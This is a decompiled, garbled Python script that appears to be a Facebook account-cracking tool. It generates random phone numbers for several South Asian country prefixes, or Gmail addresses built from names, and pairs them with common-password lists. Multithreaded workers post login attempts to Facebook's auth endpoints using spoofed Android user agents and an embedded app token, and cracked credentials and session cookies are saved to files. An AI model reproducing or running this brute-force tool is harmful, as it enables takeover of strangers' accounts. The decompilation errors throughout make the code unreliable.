    if xd in ('2', '02'):
    try:
        pak()
        
    if None in ('3', '03'):
    try:
        ind()
        
    if None in ('4', '04'):
    try:
        afg()
        
    if None in ('5', '05'):
    try:
        bd()
        exit()
        
    if None in ('6', '06'):
    try:
        gmail()
        
    if None in ('0', '00'):
    try:
        exit(' Thanks for use 🥰 ')
        
    None(' Option not found in menu...')


def pak():
    try:
    user = []
    clear()
    print('\x1b[1;35m Code example: 0306,0315,0335,0345')
    code = input('\x1b[1;37m put code: ')
    limit = int(input('\x1b[1;35m example: 2000, 3000, 5000, 10000\n\x1b[1;37m put limit: '))
    exvept ValueError:
        limit = 5000
    clear()
    print(' [1] METHOD 1')
    linex()
    mthd = input(' Choose: ')
    clear()
    print(' [1] Number + khan password')
    linex()
    pcs = input(' [?] Select: ')
    for nmbr in range(limit):
    try:
        nmp = (
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        ZISHAN = tred(max_workers = 70)
        clear()
        tl = str(len(user))
        print(' Total ids : \x1b[1;32m' + tl + ' ')
        print('\x1b[1;37m Choice code  :\x1b[1;32m ' + code)
        linex()
        for psx in user:
            ids = code + psx
            if pcs in ('1', '01'):
    try:
                passlist = [
                    psx,
                    ids,
                    'khankhan',
                    'khan1122',
                    'ali12345',
                    'khanbaba',
                    'pakistan',
                    'khan12345',
                    'ali1122',
                    'khankhan12345',
                    'khan',
                    'baloch',
                    'pubg',
                    'pubg1122']
            if mthd in ('1', '01'):
    try:
                ZISHAN.submit(ZISHAN4, ids, passlist)
            
            
            if not ''.join:
                pass


def ind():
    try:
    user = []
    clear()
    print('\x1b[1;35m Code example: 91963, 91930, 91969')
    code = input('\x1b[1;37m put code: ')
    limit = int(input('\x1b[1;35m example: 2000, 3000, 5000, 10000\n\x1b[1;37m put limit: '))
    exvept ValueError:
        limit = 5000
    clear()
    print(' [1] METHOD 1')
    linex()
    mthd = input(' Choose: ')
    clear()
    print(' [1] Number + india password')
    linex()
    pcs = input(' [?] Select: ')
    for nmbr in range(limit):
    try:
        nmp = (
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        ZISHAN = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(' Total ids : \x1b[1;32m' + tl + ' ')
        print('\x1b[1;37m Choice code  :\x1b[1;32m ' + code)
        linex()
        for psx in user:
            ids = code + psx
            if pcs in ('1', '01'):
    try:
                passlist = [
                    psx,
                    ids,
                    '57273200',
                    '59039200',
                    '57575751']
            if mthd in ('1', '01'):
    try:
                ZISHAN.submit(ZISHAN4, ids, passlist)
            
            if not ''.join:
                pass
    print('\x1b[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
    linex()
    input(' Press enter to back ')
    os.system('python ZISHAN.py')


def bd():
    try:
    user = []
    clear()
    print('\x1b[1;35m Code example: 016,017,018,019')
    code = input('\x1b[1;37m put code: ')
    limit = int(input('\x1b[1;35m example: 2000, 3000, 5000, 10000\n\x1b[1;37m put limit: '))
    exvept ValueError:
        limit = 5000
    clear()
    print(' [1] METHOD 1')
    linex()
    mthd = input(' Choose: ')
    clear()
    print(' [1] Number + Bd password')
    linex()
    pcs = input(' [?] Select: ')
    for nmbr in range(limit):
    try:
        nmp = (
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        ZISHAN = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(' Total ids : \x1b[1;32m' + tl + ' ')
        print('\x1b[1;37m Choice code  :\x1b[1;32m ' + code)
        linex()
        for psx in user:
            ids = code + psx
            if pcs in ('1', '01'):
    try:
                passlist = [
                    psx,
                    ids,
                    'bangladesh',
                    'Bangladesh',
                    'bangla',
                    '77889900',
                    '@@@###',
                    '57273200',
                    '59039200']
            if mthd in ('1', '01'):
    try:
                ZISHAN.submit(ZISHAN4, ids, passlist)
            
            
            if not ''.join:
                pass


def afg():
    try:
    user = []
    clear()
    print('\x1b[1;35m Code example: 9370,9377,9379,9374', '9378')
    code = input('\x1b[1;37m put code: ')
    limit = int(input('\x1b[1;35m example: 2000, 3000, 5000, 10000\n\x1b[1;37m put limit: '))
    exvept ValueError:
        limit = 5000
    clear()
    print(' [1] METHOD 1')
    linex()
    mthd = input(' Choose: ')
    clear()
    print(' [1] Number + afgan password')
    linex()
    pcs = input(' [?] Select: ')
    for nmbr in range(limit):
    try:
        nmp = (
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        ZISHAN = tred(max_workers = 37)
        clear()
        tl = str(len(user))
        print(' Total ids : \x1b[1;32m' + tl + ' ')
        print('\x1b[1;37m Choice code  :\x1b[1;32m ' + code)
        linex()
        for psx in user:
            ids = code + psx
            if pcs in ('1', '01'):
    try:
                passlist = [
                    psx,
                    ids,
                    'first8',
                    'last8',
                    'first6',
                    'last6',
                    'afghan',
                    'afghan12345',
                    'afghan123',
                    '600700',
                    'afghanistan',
                    'afghan1122',
                    '500500',
                    '100200',
                    '10002000',
                    '900900',
                    'kabul123',
                    'afghan1234',
                    'kabul1234',
                    'khankhan',
                    'khan123',
                    'khan123456',
                    'khan786',
                    '۱۳۳۳۵۶۷۸۹',
                    '۱۳۳۳۵۶',
                    '۱۰۰۲۰۰',
                    '۵۰۰۵۰۰',
                    '۵۰۰۶۰۰']
            if mthd in ('1', '01'):
    try:
                ZISHAN.submit(ZISHAN4, ids, passlist)
            
            
            if not ''.join:
                pass


def gmail():
    try:
    os.system('rm -rf .re.txt')
    clear()
    print('\x1b[1;37m example: ramzan, ali, sajjad, faizan\x1b[1;97m')
    linex()
    first = input(' Put first name: ')
    linex()
    print('\x1b[1;37m example: khan, ahmad, ali \x1b[1;97m')
    linex()
    last = input(' Put last name: ')
    linex()
    print(' Example: @gmail.com ')
    linex()
    domain = input(' domain: ')
    linex()
    limit = int(input(' Put limit: '))
    exvept ValueError:
        limit = 5000
    clear()
    print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
    linex()
    pxc = input(' Choose : ')
    clear()
    print(' [1] METHOD 1')
    linex()
    mthd = input(' Choose: ')
    linex()
    print(' Getting gmails...')
    lists = [
        '3',
        '4']
    for xd in range(limit):
    try:
        lchoice = random.choice(lists)
        if '3' in lchoice:
            mail = (
random.choice(string.digits)None)(range(3)())
            open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
        mail = (
random.choice(string.digits)None)(range(4)())
        open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
        fo = open('.re.txt', 'r').read().splitlines()
        ZISHAN = tred(max_workers = 30)
        total = str(len(fo))
        clear()
        print(' Total ids : \x1b[1;32m' + total + ' ')
        linex()
        for user in fo:
            (ids, names) = user.split('|')
            first_name = names.rsplit(' ')[0]
            last_name = names.rsplit(' ')[1]
            except IndexError:
                ''.join
                last_name = 'Khan'
            fs = first_name.lower()
            ls = last_name.lower()
            if pxc in ('1', '01'):
    try:
                passlist = [
                    fs + ls,
                    fs + ' ' + ls,
                    fs]
            if pxc in ('2', '02'):
    try:
                passlist = [
                    fs + ls,
                    fs + ' ' + ls,
                    fs + '123',
                    fs + '12345',
                    fs + '1122']
            if pxc in ('3', '03'):
    try:
                passlist = [
                    first_name + last_name,
                    first_name + ' ' + last_name,
                    first_name + '123']
            passlist = [
                fs + ls,
                fs + ' ' + ls,
                first_name + last_name,
                first_name + ' ' + last_name,
                fs + '123',
                fs + '786',
                fs + '12345',
                fs + '1122']
            if mthd in ('1', '01'):
    try:
                ZISHAN.submit(ZISHAN4, ids, passlist)
            
            if not ''.join:
                pass
    print('\x1b[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
    linex()
    input(' Press enter to back ')
    os.system('python ZISHAN.py')


def api1(ids, names, passlist):
    try:
    global loop
    sys.stdout.write(f'\r\r\x1b[1;37m [ZXB-M1] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m')
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
        application_version_code = str(random.randint(0, 999999999))
        __iam_genius = random.choice(android_models)
        phone_model = __iam_genius.split('|')[0]
        phone_company = __iam_genius.split('|')[1]
        dimensions = __iam_genius.split('|')[2]
        ffb = random.choice(fbks)
        dvlk = random.choice(usr)
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/33.0.0.45.52;FBBV/3783725;[FBAN/FB4A;FBAV/413.0.0.31.13;FBBV/41628321;[FBAN/FB4A;FBAV/67.0.0.43.63;FBBV/24683131;[FBAN/FB4A;FBAV/30.0.0.47.65;FBBV/6415265;[FBAN/Orca-Android;FBAV/299.0.0.12.112;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/199281912;FBCR/ZONG;FBMF/samsung;FBBD/samsung;FBDV/SM-G889F;FBSV/10;FBDM/{density=2.0,width=720,=height=1200};FBCA/armeabi-v7a:armeabi;]' + '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G889A;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (
random.choice(digits)None)(range(2)())
        j2 = li2 + j1
        device_family_id = str(uuid.uuid4())
        adid = str(uuid.uuid4())
        machine_id = (
random.choice(ascii_uppercase + ascii_lowercase + digits + '_')None)(range(24)())
        data = {
            'advertiser_id': adid,
            'encrypted_msisdn': '',
            'currently_logged_in_userid': '0',
            'locale': 'en_MX',
            'client_country_code': 'MX',
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
        head = {
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-type': 'unknown',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent': ua,
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-friendly-name': 'authenticate',
            'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Liger' }
        url = 'https://b-api.facebook.com/method/auth.login'
        po = requests.post(url, data = data, headers = head, allow_redirects = False).text
        q = json.loads(po)
        if 'session_key' in q:
            print('\r\r\x1b[1;32m [ZXB-OK] ' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/ZXB-COKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
            oks.append(ids)
            ''
        if 'www.facebook.com' in q['error_msg']:
            if 'y' in pcp:
                print('\r\r\x1b[38;5;205m [ZXB-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ZXB-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                'meta_inf_fbmeta'
            open('/sdcard/ZXB-CP.txt', 'a').write(ids + '|' + pas + '\n')
            '1.0'
        loop += 1
        
        except requests.exceptions.ConnectionError:
            'login_location_accuracy_m'
            time.sleep(10)
            
        if 'login_location_accuracy_m':
            e = machine_id
            
            
            
        e = machine_id
        


def api2(ids, names, passlist):
    try:
    global loop
    sys.stdout.write(f'\r\r\x1b[1;37m [ZISHAN-M2] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m')
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        en = random.choice([
            'en_US',
            'en_GB'])
        cph = random.choice([
            'CPH1979',
            'CPH1983',
            'CPH1987',
            'CPH2005',
            'CPH2009',
            'CPH2015',
            'CPH2059',
            'CPH2061',
            'CPH2065',
            'CPH2069',
            'CPH2071',
            'CPH2073',
            'CPH2077',
            'CPH2091',
            'CPH2095',
            'CPH2099',
            'CPH2137',
            'CPH2139',
            'CPH2145',
            'CPH2161',
            'CPH2185',
            'CPH2201',
            'CPH2209',
            'CPH1801',
            'CPH1803',
            'CPH1805',
            'CPH1809',
            'CPH1827',
            'CPH1837',
            'CPH1851',
            'CPH1853'])
        network = random.choice([
            'Zong',
            'null',
            'Marshmallow',
            'Telekom China'])
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/33.0.0.45.52;FBBV/3783725;[FBAN/FB4A;FBAV/413.0.0.31.13;FBBV/41628321;[FBAN/FB4A;FBAV/67.0.0.43.63;FBBV/24683131;[FBAN/FB4A;FBAV/30.0.0.47.65;FBBV/6415265;[FBAN/Orca-Android;FBAV/299.0.0.12.112;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/199281912;FBCR/ZONG;FBMF/samsung;FBBD/samsung;FBDV/SM-G889F;FBSV/10;FBDM/{density=2.0,width=720,=height=1200};FBCA/armeabi-v7a:armeabi;]' + '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G889A;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'["{xd}"]'
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (
random.choice(digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d' }
        headers = 'Keep-Alive'
        url = 'https://b-graph.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[1;32m [ZXB-OK] ' + ids + ' | ' + pas + '\x1b[1;97m')
            coki = (i['name'] + '=' + i['value']None)(po['session_cookies']())
            open('/sdcard/ZXB-COKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
            open('/sdcard/ZXB-OK.txt', 'a').write(ids + '|' + pas + '\n')
            oks.append(ids)
            ';'.join
        if twf in str(po):
    try:
            if 'y' in pcp:
                print('\r\r \x1b[1;34m[ZXB-2F] ' + ids + ' | ' + pas)
                twf.append(ids)
                'Connection'
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print('\r\r\x1b[38;5;205m [ZXB-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ZXB-CP.txt', 'a').write(ids + '|' + pas + '\n')
                'd29d67d37eca387482a8a5b740f84f62'
            open('/sdcard/ZXB-CP.txt', 'a').write(ids + '|' + pas + '\n')
            'x-fb-connection-token'
        loop += 1
        
        except requests.exceptions.ConnectionError:
            'True'
            time.sleep(10)
            
        if 'True':
            e = 'X-FB-Server-Cluster'
            
            
            
        e = 'X-FB-Server-Cluster'
        


def ZISHAN4(ids, passlist):
    try:
    global loop
    sys.stdout.write(f'\r\r\x1b[1;37m [ZISHAN-XD] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m')
    sys.stdout.flush()
    for pas in passlist:
        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        en = random.choice([
            'en_US',
            'en_GB'])
        motorola = random.choice([
            'M Bot 54',
            'M Bot 60',
            'M1',
            'M3',
            'M3s',
            'M5 Lite',
            'M6 Note',
            'Magic',
            'Maimang 5',
            'Mate 10 Lite Dual SIM',
            'Mate 20 X (China)',
            'Mate 8',
            'MB526',
            'Medias X',
            'MI 2',
            'MI 3W',
            'Mi 4 LTE',
            'MI 4i',
            'MI 5',
            'MI 5X',
            'Mi A1',
            'Mi Max',
            'Mi Max 2',
            'Mi Mix 2',
            'Milestone',
            'Miracle',
            'Moment (Sprint)',
            'Monza',
            'Motion Plus',
            'Moto C',
            'Moto E2 (4G LTE)',
            'Moto E3 Power',
            'Moto E4',
            'Moto E4 Plus',
            'Moto E5',
            'Moto E5 Plus',
            'Moto G',
            'Moto G 2nd Gen',
            'Moto G Play',
            'Moto G3',
            'Moto G3 Turbo Edition',
            'Moto G4',
            'Moto G5 Plus',
            'Moto G5s',
            'Moto G5s Plus',
            'Moto G6',
            'Moto X',
            'Moto X 2nd Gen (AT&T)',
            'Moto Z',
            'Multipad 2 Ultra Duo 8.0 3G',
            'MultiPhone 3350 Duo',
            'MultiPhone 4044 Duo',
            'MultiPhone 5504 DUO',
            'Multiphone 7600 Duo',
            'MX2',
            'MX380',
            'MX5'])
        mmp = random.choice([
            '13 Pro',
            'Black Shark',
            'Black Shark 2',
            'Black Shark 3',
            'Black Shark 3S',
            'Black Shark 4',
            'Black Shark 4 Pro',
            'Black Shark 5',
            'Black Shark 5 Pro',
            'Black Shark Helo',
            'Civi',
            'Civi 2',
            'Hongmi',
            'Hongmi 1S',
            'Hongmi 2',
            'Hongmi 2 3G',
            'Hongmi 2 4G',
            'Hongmi 4G',
            'Hongmi Note 1TD',
            'Mi Box 4',
            'Mi Cancro',
            'Mi CC 9',
            'Mi CC 9 Pro',
            'Mi CC 9e',
            'Mi CC9',
            'Mi Laser Projector 150',
            'Mi Max',
            'Mi Max 2',
            'Mi Max 3',
            'Mi MAX2',
            'Mi Max3',
            'Mi Mix',
            'Mi Mix 2',
            'Mi Mix 2S',
            'Mi Mix 3',
            'Mi Mix 3 5G',
            'Mi Mix 4',
            'Mi Mix Fold',
            'Mi Note 10',
            'Mi Note 10 Lite',
            'Mi Note 10 Pro',
            'Mi Note 11',
            'Mi Note 2',
            'Mi Note 3',
            'Mi Note 8',
            'Mi Note LTE',
            'Mi Note Pro',
            'Mi Note10',
            'Mi Note5',
            'Mi One',
            'Mi One C1',
            'Mi One Plus',
            'Mi Pad',
            'Mi Pad 2',
            'Mi Pad 3',
            'Mi Pad 4',
            'Mi Pad 4 Plus',
            'Mi Pad 5',
            'Mi Pad 5 Pro',
            'Mi Pad 5 Pro 5G',
            'Mi Pad4',
            'Mi Pad5',
            'Mi Play',
            'Mi XL',
            'Mi5',
            'MiTV 4A',
            'MiTV 4A Pro',
            'MiTV 4C',
            'MiTV 4I',
            'MiTV 4S',
            'MiTV 4X',
            'MiTV P1',
            'MiTV Q1',
            'MiTV Stick',
            'MiTV Stick 4K',
            'Mix Fold 2',
            'MT6765 G Series',
            'Note 12 Pro',
            'Pad 6 Pro',
            'Pocophone F1',
            'Qin 1s+',
            'Qin 2',
            'Qin 2 Pro',
            'Redmi 11',
            'Redmi 12',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 6',
            'Redmi 7',
            'Redmi 8',
            'Redmi 9',
            'Redmi A1',
            'Redmi A2',
            'Redmi A3',
            'Redmi K30',
            'Redmi K40',
            'Redmi K50',
            'Redmi K60',
            'Redmi note',
            'Redmi Note 1',
            'Redmi Note 10Redmi Note 11',
            'Redmi Note 12',
            'Redmi Note 12T',
            'Redmi Note 13',
            'Redmi Note 15 Pro',
            'Redmi Note 2',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi Note 5 Pro',
            'Redmi Note 6',
            'Redmi Note 7',
            'Redmi Note 7 Pro',
            'Redmi Note 8 Pro',
            'Redmi Note 8T',
            'Redmi Note 9',
            'Redmi Note 9 5G',
            'Redmi Note 9 Pro',
            'Redmi Note 9 Pro 5G',
            'Redmi Note 9 Pro Max',
            'Redmi Note 9S',
            'Redmi Note 9T',
            'Redmi Note 9T 5G',
            'Redmi Note Prime',
            'Redmi Note10',
            'Redmi Note10T',
            'Redmi Note7',
            'Redmi Note8',
            'Redmi Note8T',
            'Redmi Note9',
            'Redmi Pad',
            'Redmi Pro',
            'Redmi S2',
            'Redmi X',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Redmi Y3',
            'Redmi 2',
            'Redmi 3',
            'Redmi 3S',
            'Redmi 4',
            'Redmi 4A',
            'Redmi 4X',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 4X',
            'Redmi Note 5',
            'Redmi Note 5 Pro',
            'Redmi Note 5A',
            'Redmi Note 5A Prime',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby'])
        mmm = random.choice([
            'Ruby',
            'V10 (AT&T)',
            'V10 (T-Mobile)',
            'V10 (Verizon)',
            'V1Max',
            'V20',
            'V20 (AT&T)',
            'V20 (Sprint)',
            'V20 (T-Mobile)',
            'V20 (Verizon)',
            'V3',
            'V5',
            'V5s',
            'V7',
            'V7 Plus',
            'V808',
            'V9',
            'Valencia',
            'Vdeo 2',
            'Vega Iron 2 WiFi',
            'Vibe K5',
            'Vibe K5 Note',
            'Vibe K5 Plus Dual SIM',
            'Vibe X',
            'Vibe Z',
            'Vision',
            'Vision 3 Dual SIM',
            'Volt LS740',
            'VR Bot 552',
            'VX5500',
            'Y21',
            'Y21L',
            'Y28',
            'Y3 (2018)',
            'Y336-U02',
            'Y5 Dual SIM (2017)',
            'Y5 II',
            'Y5 Prime 2018 Dual SIM',
            'Y51',
            'Y51L',
            'Y55L',
            'Y6 (2018)',
            'Y6 Dual SIM (2018)',
            'Y6 Prime (2018)',
            'Y65',
            'Y66',
            'Y69',
            'Y71',
            'Y81',
            'Y83',
            'Yota Phone 2',
            'YP-GI1'])
        bbbb = random.choice([
            'PQ3B.190801.002',
            'PQ1A.181205.002.A1',
            'G950FXXU4DSBA',
            'G950FXXS5DSF1',
            'G950FXXS8DTC6',
            'G998USQU1ATCU',
            'G985FXXU7DTJ2',
            'N986BXXU1BTJ4',
            'A525FXXU3AUG4',
            'T970XXU3BUI7',
            'F916BXXU1BTKF',
            'N970FXXS8ETK4',
            'G975USQU4ETG1',
            'A715FXXU3ATI8',
            'T500XXU3BUA8',
            'OPM6.171019.030.K1',
            'OPM2.171026.006.C1',
            'TQ1A.230105.001.A3',
            'SQ1A.211205.008',
            'SD1A.210817.037.A1',
            'RP1A.201005.004.A1',
            'PQ1A.181205.006',
            'N9F27L',
            'PPR1.180610.011',
            'PPR2.180905.006',
            'QP1A.191105.003',
            'RD1A.201105.003.C1',
            'MMB29U',
            'NDE63H',
            'N4F26J',
            'NMF27D',
            'N4F26X',
            'KOT49H',
            'JWR66L',
            'LMY48G',
            'LMY48J',
            'MDB08M',
            'HLK75H',
            'HLK75F',
            'HRI83',
            'HLK75C',
            'EPE54B',
            'G950FXXU3CRGH',
            'G950FXXS6DTA1'])
        mmmmm = random.choice([
            'Optimus Vu',
            'OT-7025D',
            'P10 Lite LTE',
            'P2',
            'P20 Lite',
            'P30 Pro (Global)',
            'P3400',
            'P55 Max',
            'P7 Max',
            'P8 Lite',
            'P9 Lite',
            'Pacific 800i',
            'Pearl 8100',
            'Phoenix 2',
            'Phone',
            'Pixel',
            'Pixel 3',
            'Pixel XL',
            'Pixi',
            'Prada 3.0',
            'Pre3',
            'Primo GH7',
            'Quad EVO Energy 5',
            'Quantum 4',
            'Radar 4G',
            'Radar C110e',
            'Realme 2',
            'Red Rice',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby',
            'S4502M',
            'S4505M',
            'S4702M',
            'S580',
            'S616',
            'S660',
            'Sensation',
            'SGH-E250',
            'SGH-I547',
            'SM-G485F',
            'Spark',
            'Star 3 Duos',
            'Storm 9530',
            'Stream',
            'Stylo 2 Plus (T-Mobile)',
            'Stylus 2',
            'TM-4377',
            'Torch 4G 9810'])
        mmmm = random.choice([
            'Optimus Vu',
            'OT-7025D',
            'P10 Lite LTE',
            'P2',
            'P20 Lite',
            'P30 Pro (Global)',
            'P3400',
            'P55 Max',
            'P7 Max',
            'P8 Lite',
            'P9 Lite',
            'Pacific 800i',
            'Pearl 8100',
            'Phoenix 2',
            'Phone',
            'Pixel',
            'Pixel 3',
            'Pixel XL',
            'Pixi',
            'Prada 3.0',
            'Pre3',
            'Primo GH7',
            'Quad EVO Energy 5',
            'Quantum 4',
            'Radar 4G',
            'Radar C110e',
            'Realme 2',
            'Red Rice',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby',
            'S4502M',
            'S4505M',
            'S4702M',
            'S580',
            'S616',
            'S660',
            'Sensation',
            'SGH-E250',
            'SGH-I547',
            'SM-G485F',
            'Spark',
            'Star 3 Duos',
            'Storm 9530',
            'Stream',
            'Stylo 2 Plus (T-Mobile)',
            'Stylus 2',
            'TM-4377',
            'Torch 4G 9810'])
        cph = random.choice([
            'CPH1979',
            'CPH1983',
            'CPH1987',
            'CPH2005',
            'CPH2009',
            'CPH2015',
            'CPH2059',
            'CPH2061',
            'CPH2065',
            'CPH2069',
            'CPH2071',
            'CPH2073',
            'CPH2077',
            'CPH2091',
            'CPH2095',
            'CPH2099',
            'CPH2137',
            'CPH2139',
            'CPH2145',
            'CPH2161',
            'CPH2185',
            'CPH2201',
            'CPH2209',
            'CPH1801',
            'CPH1803',
            'CPH1805',
            'CPH1809',
            'CPH1827',
            'CPH1837',
            'CPH1851',
            'CPH1853'])
        network = random.choice([
            'Zong',
            'null',
            'Marshmallow',
            'Telekom China'])
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/FB4A;FBAV/33.0.0.45.52;FBBV/3783725;[FBAN/FB4A;FBAV/413.0.0.31.13;FBBV/41628321;[FBAN/FB4A;FBAV/67.0.0.43.63;FBBV/24683131;[FBAN/FB4A;FBAV/30.0.0.47.65;FBBV/6415265;[FBAN/Orca-Android;FBAV/299.0.0.12.112;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/199281912;FBCR/ZONG;FBMF/samsung;FBBD/samsung;FBDV/SM-G889F;FBSV/10;FBDM/{density=2.0,width=720,=height=1200};FBCA/armeabi-v7a:armeabi;]' + '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G889A;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
